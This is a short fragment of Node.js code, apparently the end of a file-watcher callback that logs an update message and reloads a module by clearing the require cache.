	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});